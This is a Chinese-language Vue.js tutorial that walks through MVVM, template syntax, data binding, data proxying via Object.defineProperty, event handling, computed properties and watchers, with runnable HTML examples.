<h1>VUE</h1>

----



# 目录

[TOC]





---





# 一、简介



## 1.1：是什么



Vue (读音 `/vjuː/`，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。



## 1.2：vue3带来了什么



### 1.性能的提升



- 打包大小减少41%

- 初次渲染快55%, 更新渲染快133%

- 内存减少54%

  ......

  

### 2.源码的升级



- 使用Proxy代替defineProperty实现响应式

- 重写虚拟DOM的实现和Tree-Shaking

  ......

  

### 3.拥抱TypeScript



- Vue3可以更好的支持TypeScript



### 4.新的特性



1. Composition API（组合API）

   - setup配置
   - ref与reactive
   - watch与watchEffect
   - provide与inject
   - ......
2. 新的内置组件
   - Fragment 
   - Teleport
   - Suspense
3. 其他改变

   - 新的生命周期钩子
   - data 选项应始终被声明为一个函数
   - 移除keyCode支持作为 v-on 的修饰符
   - ......



## 1.3：vue周边库



1. vue-cli: vue 脚手架 

2. vue-resource 

3. axios 

4. vue-router: 路由 

5. vuex: 状态管理 

6. element-ui: 基于 vue 的 UI 组件库(PC 端)



## 1.4：MVVM模型



> 先了解一下vue[再来看](#三、VUE基础（一）)



### 1.简介



1. M：模型(Model) ：对应 data 中的数据 

2. V：视图(View) ：模板 

3. VM：视图模型(ViewModel) ： Vue 实例对象

<img src="images/image-20211216114136221.png" alt="image-20211216114136221" style="zoom:80%;" />



### 2.代码



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>理解MVVM</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			MVVM模型
						1. M：模型(Model) ：data中的数据
						2. V：视图(View) ：模板代码
						3. VM：视图模型(ViewModel)：Vue实例
			观察发现：
						1.data中所有的属性，最后都出现在了vm身上。
						2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校名称：{{name}}</h1>
			<h1>学校地址：{{address}}</h1>
			<!-- <h1>测试一下1：{{1+1}}</h1>
			<h1>测试一下2：{{$options}}</h1>
			<h1>测试一下3：{{$emit}}</h1>
			<h1>测试一下4：{{_c}}</h1> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
			}
		})
		console.log(vm)
	</script>
</html>
```



### 3.总结



+ data中所有的属性，最后都出现在了vm身上。
+ vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。





# 二、helloworld



## 2.1：下载vue.js



vue.js

```java
https://cdn.jsdelivr.net/npm/vue@2
```

vue.min.js

```java
https://cdn.jsdelivr.net/npm/vue@2
```



## 2.2：创建html页面



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="app">
        <h1>Hello {{name}}</h1>
    </div>
</body>
<script type="text/javascript">
    new Vue({
        el: "#app",
        data:{
            name: "小糊涂"
       }
    });

</script>
</html>
```



## 2.3：页面测试



<img src="images/image-20211215190558549.png" alt="image-20211215190558549" style="zoom:80%;" />

## 2.4：总结



初识Vue：

1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；

2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；

3.root容器里的代码被称为【Vue模板】；

4.Vue实例和容器是一一对应的；

5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；

6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；	

7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；




```java
注意区分：js表达式 和 js代码(语句)
			1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
						(1). a
						(2). a+b
						(3). demo(1)
						(4). x === y ? 'a' : 'b'

			2.js代码(语句)
						(1). if(){}
						(2). for(){}
```





## 2.5：注意



```java
Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
```





# 三、VUE基础（一）



> 基础既是核心





## 3.1：模板语法



### 1.简介



Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。所有 Vue.js 的模板都是合法的 HTML，所以能被遵循规范的浏览器和 HTML 解析器解析。

在底层的实现上，Vue 将模板编译成虚拟 DOM 渲染函数。结合响应系统，Vue 能够智能地计算出最少需要重新渲染多少组件，并把 DOM 操作次数减到最少。

如果你熟悉虚拟 DOM 并且偏爱 JavaScript 的原始力量，你也可以不用模板，直接写渲染 (render) 函数，使用可选的 JSX 语法。



### 2.插值语法



#### 简介



数据绑定最常见的形式就是使用“Mustache”语法 (双大括号) 的文本插值：

```java
<span>Message: {{ msg }}</span>
```



Mustache 标签将会被替代为对应数据对象上 `msg` property 的值。无论何时，绑定的数据对象上 `msg` property 发生了改变，插值处的内容都会更新。

> 你的站点上动态渲染的任意 HTML 可能会非常危险，因为它很容易导致 [XSS 攻击](https://en.wikipedia.org/wiki/Cross-site_scripting)。请只对可信内容使用 HTML 插值，**绝不要**对用户提供的内容使用插值。



#### 案例



```java
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="app">
  <h1>插值语法 ： {{name}}</h1>
</div>
</body>
<script type="text/javascript">
  new Vue({
    el: "#app",
    data:{
      name: "小糊涂"
    }
  });
</script>
</html>
```



### 3.指令语法



#### 简介



指令 (Directives) 是带有 `v-` 前缀的特殊 attribute。指令 attribute 的值预期是**单个 JavaScript 表达式** (`v-for` 是例外情况，稍后我们再讨论)。指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM。回顾我们在介绍中看到的例子：

```java
<p v-if="seen">现在你看到我了</p>
```

这里，`v-if` 指令将根据表达式 `seen` 的值的真假来插入/移除 `<p>` 元素。



#### 案例



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>模板语法</title>
  <!-- 引入Vue -->
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h1>插值语法</h1>
  <h3>你好，{{name}}</h3>
  <hr/>
  <h1>指令语法</h1>
  <a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
  <a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'jack',
      school:{
        name:'百度',
        url:'http://www.baidu.com',
      }
    }
  })
</script>
</html>
```



### 4.总结



Vue模板语法有2大类：

+ 1.插值语法：
  + 功能：用于解析标签体内容。
  + 写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

+ 2.指令语法：

  + 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。

 ```java
举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性
 ```

  + 备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。



## 3.2：数据绑定



### 1.简介



vue中只有两种数据绑定：

+ 单向绑定(v-bind)：数据只能从data流向页面。
+ 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。



> 备注：
>
> + 双向绑定一般都应用在表单类元素上（如：input、select等）
> + v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。





### 2.单项绑定



#### 简介



> 数据只能从data流向页面。



#### 代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
<!--  普通写法
  单向数据绑定：<input type="text" v-bind:value="name"><br/>-->

    <!--简写-->
    单向数据绑定：<input type="text" :value="name"><br/>
    数据显示：{{name}}
</div>
</body>

<script type="text/javascript">
    new Vue({
        el:'#root',
        data:{
            name:'小糊涂'
        }
    })
</script>
</html>
```



#### 测试

> 输入框输入内容观察数据显示的数据是否会变化？（不会变）

<img src="images/image-20211216112043918.png" alt="image-20211216112043918" style="zoom:80%;" />



### 3.双向数据绑定



#### 简介



据不仅能从data流向页面，还可以从页面流向data。



#### 代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
<!--  普通写法
  单向数据绑定：<input type="text" v-model:value="name"><br/>-->
    <!--简写-->
    双向数据绑定：<input type="text" v-model="name"><br/>
    数据显示：{{name}}
</div>
</body>

<script type="text/javascript">
    new Vue({
        el:'#root',
        data:{
            name:'小糊涂'
        }
    })
</script>
</html>
```



##### 测试



> 输入框输入内容观察数据显示的数据是否会变化？（会变）



<img src="images/image-20211216112340204.png" alt="image-20211216112340204" style="zoom:80%;" />



### 4.注意



使用双向绑定时：`v-model`不能这样写：

```java
<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
<!-- <h2 v-model:x="name">你好啊</h2> -->
```



## 3.3：VUE实例中的写法



### 1.简介



<img src="images/image-20211216112843319.png" alt="image-20211216112843319" style="zoom:80%;" />



### 2.el的写法



#### 示例



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>hello {{name}}</h1>
</div>
</body>

<script type="text/javascript">
    //el的两种写法
    const v = new Vue({
        //el:'#root', //第一种写法
        data: {
            name: '尚硅谷'
        }
    })
    console.log(v)
    v.$mount('#root') //第二种写法
</script>
</html>
```



#### 总结



(1).new Vue时候配置el属性。

(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。





### 3.data写法



#### 示例



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h1>hello {{name}}</h1>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el:'#root',
/*    data:{
      name:'小糊涂' 第一种
    }*/
    data(){
      return {
        name: "小糊涂" //第二种
      }
    }
  })
</script>
</html>
```



#### 总结



+ 对象式
+ 函数式
  + 如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。



### 4.注意



> 由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。



## 3.4：数据治理



>   鼎鼎有名的Vue.js实现数据双向绑定的原理就是用的Object.defineProperty，



### 1.Object.defineproperty方法



#### 语法



```java
Object.defineProperty(obj, prop, descriptor)
```



+ obj：需要定义属性的对象
+ prop：需要定义的属性
+ descriptor：属性的描述描述符
+ 返回值：返回此对象



#### 例子



```java
let  obj = Object.create(null);
let descriptor = {
    configurable:false,
    writable:false,
    enumerable:false,
    value:'hello world'
};
Object.defineProperty(obj,'hello',descriptor);
 
console.log(obj.hello);//hello world
```



#### 数据描述符



数据描述符是一个具有值的属性，该值可能是可写的，也可能是不可写的。

它具有以下可选的键值：

+ configurable：表示该属性能否通过delete删除，能否修改属性的特性或者能否修改访问器属性，默认为false。当且仅当该属性的configurable为true时，才能实现上述行为。

+ enumerable：表示该属性是否可以枚举，即可否通过for..in访问属性。默认为false。

+ value：表示该属性的值。可以是任何有效的JS值。默认为undefined。

+ writable：表示该属性的值是否可写，默认为false。当且仅当属性的writable为true时，其值才能被赋值运算符改变。



```java
    var obj = {
        test: "hello"
    }
    for (let objKey in obj) {
        console.log(objKey)
    }
    //对象已有的属性添加特性描述
    Object.defineProperty(obj, "test", {
        configurable: true | false,
        enumerable: true | false,
        value: '任意类型的值',
        writable: true | false
    });
    //对象新添加的属性的特性描述
    Object.defineProperty(obj, "newKey", {
        configurable: true | false,
        enumerable: true | false,
        value: '任意类型的值',
        writable: true | false
    });
    console.log(obj)
    for (let objKey in obj) {
        console.log(objKey)
    }
```







#### **存取器描述**



当使用存取器描述属性的特性的时候，允许设置以下特性属性：



```java
var obj = {};
Object.defineProperty(obj,"newKey",{
    get:function (){} | undefined,
    set:function (value){} | undefined
    configurable: true | false
    enumerable: true | false
});
```



#### 注意



**注意：当使用了getter或setter方法，不允许使用writable和value这两个属性**



#### **getter/setter**



当设置或获取对象的某个属性的值的时候，可以提供getter/setter方法。

- getter 是一种获得属性值的方法
- setter是一种设置属性值的方法。

在特性中使用get/set属性来定义对应的方法。



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h1>hello {{name}}</h1>
</div>
</body>

<script>
  var obj = {};
  var initValue = 'hello';
  Object.defineProperty(obj,"newKey",{
    get:function (){
      console.log('当获取值的时候触发的函数')
      return initValue;
    },
    set:function (value){
      console.log('当设置值的时候触发的函数,设置的新值通过参数value拿到')
      initValue = value;
    }
  });
  //获取值
  console.log( obj.newKey );  //hello
  //设置值
  obj.newKey = 'change value';
  console.log( obj.newKey ); //change value

</script>
</html>
```





#### 个人小总结



如果结合java来说这些东西就好比java中的get/set方法





### 2.何为数据代理



数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
```





### 3.Vue中的数据代理



+ 1.Vue中的数据代理：
  + 通过vm对象来代理data对象中属性的操作（读/写）
+ 2.Vue中数据代理的好处：
  + 更加方便的操作data中的数据
+ 3.基本原理：
  + 通过Object.defineProperty()把data对象中所有属性添加到vm上。
  + 为每一个添加到vm上的属性，都指定一个getter/setter。
  + 在getter/setter内部去操作（读/写）data中对应的属性。



## 3.5：event对象



Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。

事件通常与函数结合使用，函数不会在事件发生前被执行！

详情请看下面：

https://www.cnblogs.com/zxktxj/archive/2012/02/26/2369176.html

https://www.w3school.com.cn/htmldom/dom_obj_event.asp



## 3.6：事件处理



### 1.简介



1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；

2.事件的回调需要配置在methods对象中，最终会在vm上；

3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；

4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；

5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
	



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>hello {{name}}</h1>
    <button v-on:click="showInfo1">点我提示信息1（不传参）</button>
    <!--简写-->
    <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: '小糊涂'
        }, methods: {
            showInfo1(event) {
                alert(1)
            },
            showInfo2(event, Number) {
                console.log(event,Number)
                alert(Number)
            }
        }
    })
</script>
</html>
```



### 3.注意



注意：我们使用@click可以使用一些简单的语句

```java
<button @click="isHost=!isHost">点击切换</button>  isHost:是布尔类型
```



## 3.7：事件修饰符



### 1.简介



1.prevent：阻止默认事件（常用）；

2.stop：阻止事件冒泡（常用）；

3.once：事件只触发一次（常用）；

4.capture：使用事件的捕获模式；

5.self：只有event.target是当前操作的元素时才触发事件；

6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>事件修饰符</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        *{
            margin-top: 20px;
        }
        .demo1{
            height: 50px;
            background-color: skyblue;
        }
        .box1{
            padding: 5px;
            background-color: skyblue;
        }
        .box2{
            padding: 5px;
            background-color: orange;
        }
        .list{
            width: 200px;
            height: 200px;
            background-color: peru;
            overflow: auto;
        }
        li{
            height: 100px;
        }
    </style>
</head>
<body>
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
   <h3>阻止默认事件（常用）</h3>
    <a href="http://www.baidu.com" @click="showInfo">点我提示信息</a>
    <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息.prevent</a>
    <h3>阻止事件冒泡（常用）</h3>
    <div class="demo1" @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
        <button @click="showInfo">点我提示信息.stop</button>
        <!-- 修饰符可以连续写 -->
       <a href="http://www.baidu.com" @click.prevent.stop="showInfo">点我提示信息</a>
       <a href="http://www.baidu.com" @click="showInfo">点我提示信息.prevent.stop</a>
    </div>
   <h3>事件只触发一次（常用）</h3>
    <button @click.once="showInfo">点我提示信息</button>
    <button @click="showInfo">点我提示信息.once</button>
    <h3>使用事件的捕获模式</h3>
    <div class="box1" @click.capture="showMsg(1)">
        div1
        <div class="box2" @click="showMsg(2)">
            div2
        </div>
    </div>
    <div class="box1" @click="showMsg(1)">
        div1.capture
        <div class="box2" @click="showMsg(2)">
            div2.capture
        </div>
    </div>
    <h3>只有event.target是当前操作的元素时才触发事件；</h3>
    <div class="demo1" @click.self="showInfo">
        <button @click="showInfo">点我提示信息</button>
    </div>

    <h3>事件的默认行为立即执行，无需等待事件回调执行完毕；</h3>
    <ul passive="demo" class="list">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
    <ul @wheel.passive="demo" class="list">
        <li>1@wheel.</li>
        <li>2@wheel.</li>
        <li>3@wheel.</li>
        <li>4@wheel.</li>
    </ul>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'小糊涂'
        },
        methods:{
            showInfo(e){
                alert('同学你好！')
                // console.log(e.target)
            },
            showMsg(msg){
                console.log(msg)
            },
            demo(){
                for (let i = 0; i < 100000; i++) {
                    console.log('#')
                }
                console.log('累坏了')
            }
        }
    })
</script>
</html>
```



## 3.8：键盘事件



### 1.简介



+ Vue中常用的按键别名：
  + 回车 => enter
  + 删除 => delete (捕获“删除”和“退格”键)
  + 退出 => esc
  + 空格 => space
  + 换行 => tab (特殊，必须配合keydown去使用)
  + 上 => up
  + 下 => down
  + 左 => left
  + 右 => right

+ Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

+ 系统修饰键（用法特殊）：ctrl、alt、shift、meta
  + 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
  + 配合keydown使用：正常触发事件。
  + 配合keypress使用：键盘按住时触发

+ 也可以使用keyCode去指定具体的按键（不推荐）
+ Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>键盘事件</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <input type="text" placeholder="按下回车提示输入" @keyup="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keydown="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keypress="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keypress.enter="showInfo">
    <input type="text" placeholder="按下回车提示输入" @keypress.huiche="showInfo">
</div>
</body>

<script type="text/javascript">
    Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
    new Vue({
        el: '#root',
        data: {
            name: '尚硅谷'
        },
        methods: {
            showInfo(e) {
                console.log(e.key, e.keyCode,e.target.value)
            }
        },
    })
</script>
</html>
```





### 3.组合键盘



```html
<!--ALT+E-->     
<input type="text" placeholder="按下回车提示输入" @keydown.alt.e="showInfo">
<!--CTRL+E-->    
<input type="text" placeholder="按下回车提示输入" @keydown.ctrl.e="showInfo">
```



## 3.9：计算属性



### 1.姓名案例



<img src="images/image-20211216180039699.png" alt="image-20211216180039699" style="zoom:80%;" />

当姓输入超过三个字的时候只显示前面三个后面的忽略掉



### 2.插值语法实现



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    姓：<input type="text" v-model="surname"><br>
    名：<input type="text" v-model="name"><br>
    全名: {{surname.length>=3?surname.substr(0,3):surname}}-{{name}}
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            surname: '张',
            name: '三'
        }
    })
</script>
</html>
```



### 3.methods实现



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"/>
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  姓：<input type="text" v-model="surname"><br>
  名：<input type="text" v-model="name"><br>
  全名: {{getFullName()}}<br>
  全名: {{getFullName}}  这里是错误的页面打开观看
</div>
</body>

<script type="text/javascript">
  new Vue({
    el: '#root',
    data: {
      surname: '张',
      name: '三'
    },methods:{
      getFullName(){
        return  this.surname.length>=3?this.surname.substr(0,3):this.surname + '-' + this.name
      }
    }
  })
</script>
</html>
```



### 4.计算属性简介





+ 定义：要用的属性不存在，要通过已有属性计算得来。
+ 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
+ get函数什么时候执行？
  + 初次读取时会执行一次。
  + 当依赖的数据发生改变时会被再次调用。
+ 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
+ 备注：
    + 计算属性最终会出现在vm上，直接读取使用即可。
    + 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。



### 5.计算属性实现



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    姓：<input type="text" v-model="surname"><br>
    名：<input type="text" v-model="name"><br>
    全名: {{getFullName}}
<!--    全名: {{getFullName()}}-->
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            surname: '张',
            name: '三'
        }, methods: {}, computed: {
            getFullName: {
                get() {
                    console.log("get被调用")
                    return this.surname.length>=3?this.surname.substr(0,3):this.surname + '-' + this.name;
                },set(value){
                    console.log("set被调用")
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    })
</script>
</html>
```



### 6.计算属性简写



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    姓：<input type="text" v-model="surname"><br>
    名：<input type="text" v-model="name"><br>
    全名: {{getFullName}}
    <!--    全名: {{getFullName()}}-->
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            surname: '张',
            name: '三'
        }, methods: {}, computed: {
            getFullName: function () {
                console.log("get被调用")
                return this.surname.length >= 3 ? this.surname.substr(0, 3) : this.surname + '-' + this.name;
            }
        }
    })
</script>
</html>
```



### 7.有用吗?



你可能已经注意到我们可以通过在表达式中调用方法来达到同样的效果：

```java
<p>Reversed message: "{{ reversedMessage() }}"</p>
```

```java
// 在组件中
methods: {
  reversedMessage: function () {
    return this.message.split('').reverse().join('')
  }
}
```



我们可以将同一函数定义为一个方法而不是一个计算属性。两种方式的最终结果确实是完全相同的。然而，不同的是**计算属性是基于它们的响应式依赖进行缓存的**。只在相关响应式依赖发生改变时它们才会重新求值。这就意味着只要 `message` 还没有发生改变，多次访问 `reversedMessage` 计算属性会立即返回之前的计算结果，而不必再次执行函数。

这也同样意味着下面的计算属性将不再更新，因为 `Date.now()` 不是响应式依赖：

```javascript
computed: {
  now: function () {
    return Date.now()
  }
}
```

相比之下，每当触发重新渲染时，调用方法将**总会**再次执行函数。

我们为什么需要缓存？假设我们有一个性能开销比较大的计算属性 **A**，它需要遍历一个巨大的数组并做大量的计算。然后我们可能有其他的计算属性依赖于 **A**。如果没有缓存，我们将不可避免的多次执行 **A** 的 getter！如果你不希望有缓存，请用方法来替代。

```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <input type="number" v-model="count">
    <h1>获取结果值testMethods: {{testMethods()}}</h1>
    <h1>获取结果值testMethods: {{testMethods()}}</h1>
    <h1>获取结果值test: {{test}}</h1>
    <h1>获取结果值test: {{test}}</h1>
    <h1>获取结果值test: {{test}}</h1>
</div>
</body>

<script type="text/javascript">
    const vm = new Vue({
            el: '#root',
            data() {
                return {
                    count: 1000
                }
            },
            methods: {
                testMethods(){
                    var result = 0;
                    console.log("testMethods")
                    for (let i = 0; i < this.count; i++) {
                        result += i
                    }
                    return result;
                }
            },
            computed: {
                test: function () {
                    var result = 0;
                    console.log("执行了test")
                    for (let i = 0; i < this.count; i++) {
                        result += i
                    }
                    return result;
                }
            }
        })
    ;
</script>
</html>
```



<img src="images/image-20211217180055248.png" alt="image-20211217180055248" style="zoom:80%;" />

## 3.10：监视属性



### 1.天气切换案例



<img src="images/image-20211217180239964.png" alt="image-20211217180239964" style="zoom:80%;" />

点击切换天气，天气为凉爽炎热





### 2.计算属性实现



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>今天天气很{{info}}</h1>
    <button @click="changeInfo">点击切换天气</button>
    <!--简写-->
    <button @click="isHost=!isHost">点击切换天气</button>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            isHost: true
        }, computed: {
            info() {
                return this.isHost ? '炎热' : '凉爽';
            }
        }, methods: {
            changeInfo() {
                this.isHost=!this.isHost
            }
        }
    })
</script>
</html>
```



### 3.简介



监视属性watch：
					1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
					2.监视的属性必须存在，才能进行监视！！
					3.监视的两种写法：
							(1).new Vue时传入watch配置
							(2).通过vm.$watch监视



### 4.监视属性实现



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>监视属性</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>今天天气很{{info}}</h1>
    <button @click="changeInfo">点击切换天气</button>
    <!--简写-->
    <button @click="isHost=!isHost">点击切换天气</button>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            isHost: true
        }, computed: {
            info() {
                return this.isHost ? '炎热' : '凉爽';
            }
        }, methods: {
            changeInfo() {
                this.isHost = !this.isHost
            }
        }, watch: {
            isHost: {
                handler(newArg,oldArg) {
                    console.log("发生了改变"+newArg,oldArg)
                }
            }
        }
    })
</script>
</html>
```



### 5.监视属性实现二



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>监视属性</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>今天天气很{{info}}</h1>
    <button @click="changeInfo">点击切换天气</button>
    <!--简写-->
    <button @click="isHost=!isHost">点击切换天气</button>
</div>
</body>

<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            isHost: true
        }, computed: {
            info() {
                return this.isHost ? '炎热' : '凉爽';
            }
        }, methods: {
            changeInfo() {
                this.isHost = !this.isHost
            }
        }
    });
    vm.$watch("isHost", function (newArg, oldArg) {
        console.log("发生了改变" + newArg, oldArg)
    })
</script>
</html>
```





### 6.初始化时执行



<img src="images/image-20211217182051639.png" alt="image-20211217182051639" style="zoom:80%;" />



### 7.深度监视



> 深度监视：
> 					(1).Vue中的watch默认不监测对象内部值的改变（一层）。
> 					(2).配置deep:true可以监测对象内部值改变（多层）。
> 			备注：
> 					(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
> 					(2).使用watch时根据数据的具体结构，决定是否采用深度监视。



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>监视属性</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>今天天气很{{info}}</h1>
    <button @click="changeInfo">点击切换天气</button>
    <!--简写-->
    <button @click="isHost=!isHost">点击切换天气</button>
    <hr>
    <h3>age的值是:{{users.age}}</h3>
    <button @click="users.age++">点我让age+1</button>
    <h3>money的值是:{{users.money}}</h3>
    <button @click="users.money++">点我让money+1</button>
    <button @click="users = {age:666,money:888}">彻底替换掉users</button>
    {{users.d}}
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            isHost: true,
            users:{
                age:18,
                money:100
            }
        }, computed: {
            info() {
                return this.isHost ? '炎热' : '凉爽';
            }
        }, methods: {
            changeInfo() {
                this.isHost = !this.isHost
            }
        }, watch: {
            users: {
                deep: true,
                handler(newArg,oldArg) {
                    console.log("发生了改变"+newArg,oldArg)
                }
            }
        }
    })
